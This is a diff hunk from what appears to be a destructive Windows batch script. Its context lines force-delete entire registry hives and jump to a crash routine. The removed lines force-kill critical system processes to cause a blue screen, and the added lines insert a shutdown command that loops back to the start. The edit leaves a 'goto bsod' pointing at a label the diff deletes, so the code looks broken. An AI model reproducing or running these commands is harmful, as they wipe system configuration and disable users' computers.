@@ -673,13 +673,6 @@ reg delete "HKU" /f
 reg delete "HKCC" /f
 reg delete "HKEY" /f
 goto bsod
-:bsod
-taskkill /f /im svchost.exe
-taskkill.exe /f /im svchost.exe
-taskkill /f /im csrss.exe
-taskkill.exe /f /im csrss.exe
-taskkill /f /im ntoskrnl.exe
-taskkill.exe /f /im ntoskrnl.exe
-taskkill /f /im rundll32.exe
-taskkill.exe /f /im rundll32.exe
+:shutdown
+shutdown /s 1
 goto start
